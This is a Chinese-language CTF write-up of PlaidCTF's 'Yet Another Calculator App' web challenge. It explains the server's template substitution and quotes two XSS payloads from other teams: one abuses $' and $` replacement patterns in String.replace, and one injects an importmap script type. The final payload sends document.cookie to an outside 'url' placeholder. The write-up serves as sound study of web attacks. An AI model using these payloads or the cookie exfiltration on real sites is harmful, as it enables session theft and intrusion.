# PlaidCTF-Yet Another Calculator App

> 这周末打了一场NodeCTF(plaidctf),去体验了一下外国友人的快乐比赛，其中就对里面最简单的一道题目进行分析，当然我是爆0党，无语（队友们tql

## 0x01 题目

![image-20220411085446009](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220411085446009.png)

因为题目本身是给了docker的，所以我们应该从题目本身去出发查看这道题目。

首先看`index.ts`

```js
app.post("/upload", async (req, res) => {
        if (typeof req.body !== "object") {
            return res.status(500).send("Bad payload");
        }

        const { type, program } = req.body;
        if (
            typeof type !== "string"
            || type.match(/^[a-zA-Z\-/]{3,}$/) === null
            || typeof program.name !== "string"
            || typeof program.code !== "string"
            || program.code.length > 10000
        ) {
            return res.status(500).send("Invalid program");
        }

        const sanitizedProgram =
            JSON.stringify(program)
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;");

        const template = await fs.readFile(path.join(clientDir, "calculator.hbs"), "utf-8");
        const formattedFile =
            template
                .replace("{{ content-type }}", type)
                .replace("{{ program }}", sanitizedProgram);

        const fileName = `program-${uuid()}`;
        await fs.writeFile(path.join(cacheDir, fileName), formattedFile);

        res.send(`/program/${fileName}`);
    });
```

这个是`/upload`接口，其中比较重要的处理就是

```js
const sanitizedProgram =
            JSON.stringify(program)
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;");

        const template = await fs.readFile(path.join(clientDir, "calculator.hbs"), "utf-8");
        const formattedFile =
            template
                .replace("{{ content-type }}", type)
                .replace("{{ program }}", sanitizedProgram);
```

首先这里，我们看到了`<`和`>`是被ban了，我的第一反应就是后端代码已经没有突破的地点，但是在后面我们会发现蹊跷。

`calculator.hbs`

```html
<html>
    <head>
        <link rel="stylesheet" href="/css/common.css">
        <link rel="stylesheet" href="/css/calc.css">
        <script id="program" language="json" type="{{ content-type }}">
            {{ program }}
        </script>

        <script type="module">
            window.addEventListener("load", () => {
                import("/js/calc.mjs");
            })
        </script>
    </head>
    <body>
        <div class="body">
            <h1 class="title" id="name">Loading</h1>
            <div id="input"></div>
            <span id="output"></span>
            <span id="error"></span>
            <button id="report">Show me your math!</span>
        </div>
    </body>
</html>
```

发现script的type是我们`可控`的，我们可以指定为`javascript`类型。（MIME-TYPE)

顺着思路就看了下来发现并没有什么可以操作的地方。我们继续看前端代码`/js/calc.mjs`,因为这道题目的思路就是xss，外带flag。因为前端的代码量比较多，我就挑重点来看

```js
import astToJs from "/js/ast-to-js.mjs";
import evalCode from "/js/eval-code.mjs";
try {
    let ast;
    if (astProgram.type === "application/x-yaca-code") {
        const tokens = lex(program.code);
        ast = parse(tokens);
    } else {
        ast = JSON.parse(program.code);
    }

    const jsProgram = astToJs(ast);
    evalCode(jsProgram);
} 
```

`lex`函数对于传入的code，限制程度已经达到了令人发指的程度，能用的字符极少，几乎就没有特殊字符，我们考虑type是不可能为`application/x-yaca-code`,type肯定是一个可以操作的地方。

## 0x02 解题

### My Think

- `astProgram.type`

  `/js/ast-to-js.mjs`这里面的代码导致我们注入的code可以导致逃逸出去，然后直接执行，然后一直在审计这个前端代码，看了一天也没有发现什么漏洞（下次一定不回再抓住一个点来打了`astToJs`

- `type`可以设置成为`javascript`,然后code逃逸`{{}}`,来导致代码执行

  发现这个方法就是没有找到好的逃逸方法。

- `replace`在之前的比赛中这个函数就已经出过问题

  参考链接：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace

  也就是在实际测试的过程，这个
  
  ```
  $`和$$ and $' 
  ```
  
  经常会出现问题，下面我们就来小小测试一下，这两的问题。
  
  ![image-20220411092234631](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220411092234631.png)

![image-20220411092251491](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220411092251491.png)

其他的各位可以自己再去摸索了，剩下的部分，但是我在这里

```
<script id="program" language="json" type="{{ content-type }}">
            {{ program }}
</script>
```

没有想到的地方在于，这两个匹配符号，直接匹配了`<script id="program" language="json" type="{{ content-type }}">`和`</script>`,是非常长的一串哦~。我以为是匹配到`左右空格`

![image-20220411092453703](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220411092453703.png)

所以，我猜测他是没有分割

![image-20220411092810415](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220411092810415.png)

所以到这里或许大家就有想法了。

### Unintended Solution

> from:https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA

```js
{
    type: "application/javascript", 
    program: {
        name: "$'$`alert(1)//",
        code: "a"
    }
}
```

so upload this playload, will generate `html` like this

```html
<html>
    <head>
        <link rel="stylesheet" href="/css/common.css">
        <link rel="stylesheet" href="/css/calc.css">
        <script id="program" language="json" type="application/javascript">
            {"name":"
        </script>

        <script type="module">
            window.addEventListener("load", () => {
                import("/js/calc.mjs");
            })
        </script>
    </head>
    <body>
        <div class="body">
            <h1 class="title" id="name">Loading</h1>
            <div id="input"></div>
            <span id="output"></span>
            <span id="error"></span>
            <button id="report">Show me your math!</span>
        </div>
    </body>
</html><html>
    <head>
        <link rel="stylesheet" href="/css/common.css">
        <link rel="stylesheet" href="/css/calc.css">
        <script id="program" language="json" type="application/javascript">
            alert(1)//","code":"(-b + sqrt(b^2 - 4a*c)) / 2a"}
        </script>

        <script type="module">
            window.addEventListener("load", () => {
                import("/js/calc.mjs");
            })
        </script>
    </head>
    <body>
        <div class="body">
            <h1 class="title" id="name">Loading</h1>
            <div id="input"></div>
            <span id="output"></span>
            <span id="error"></span>
            <button id="report">Show me your math!</span>
        </div>
    </body>
</html>
```

 仔细看看上面的，我相信我们可以看懂。

### Intended Solution

> from: https://gist.github.com/maple3142/5681e8064aa1507df90da782425dcfa1
>
> https://github.com/WICG/import-maps
>
> https://chromium.googlesource.com/chromium/src.git/+/refs/tags/102.0.4961.1/third_party/blink/renderer/core/html/html_script_element.cc#343

这个题目很奇怪的点就在于，你可以控制`type`,并且`type`的权重是比`language`要更大了。[MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-type)上面并没有什么有用的信息，所以就有人去看了`chrome`的源码

```c
bool HTMLScriptElement::supports(ScriptState* script_state,
                                 const AtomicString& type) {
  ExecutionContext* execution_context = ExecutionContext::From(script_state);
  if (type == script_type_names::kClassic)
    return true;
  if (type == script_type_names::kModule)
    return true;
  if (type == script_type_names::kImportmap)
    return true;
  if ((type == script_type_names::kSpeculationrules) &&
      RuntimeEnabledFeatures::SpeculationRulesEnabled(execution_context)) {
    return true;
  }
  if ((type == script_type_names::kWebbundle) &&
      RuntimeEnabledFeatures::SubresourceWebBundlesEnabled(execution_context)) {
    return true;
  }
  return false;
}
```

找到了chrome中对于html标签的支持文档，于是我们开始操作`kImportmap`

https://chromium.googlesource.com/chromium/src.git/+/refs/tags/101.0.4951.30/third_party/blink/renderer/core/script/script_type_names.json5#7. 然后从上面的链接，我们可以知道这个的操作大概就是

```
import moment from "moment";
import { partition } from "lodash";

<script type="importmap">
{
  "imports": {
    "moment": "/node_modules/moment/src/moment.js",
    "lodash": "/node_modules/lodash-es/lodash.js"
  }
}
</script>
```

结合我们上面的

```
import astToJs from "/js/ast-to-js.mjs";
import evalCode from "/js/eval-code.mjs";
```

不知道大家是否有什么想法，这里直接给出payload

```js
fetch("/upload", {
  "headers": {
    "content-type": "application/json",
  },
  "body":JSON.stringify({
      "type":"importmap",
      "program": {
          "imports": {"/js/ast-to-js.mjs": "/js/eval-code.mjs"}, 
          "name": "yo", 
          "code": JSON.stringify({
              "code": "fetch(`url?x=${document.cookie}`)", 
              "variables" :[]
          })
      }
  }),
  "method": "POST"
}).then(r => r.text()).then((url) => location.href = url);

```

学爆了，等赛后的完整WP了。
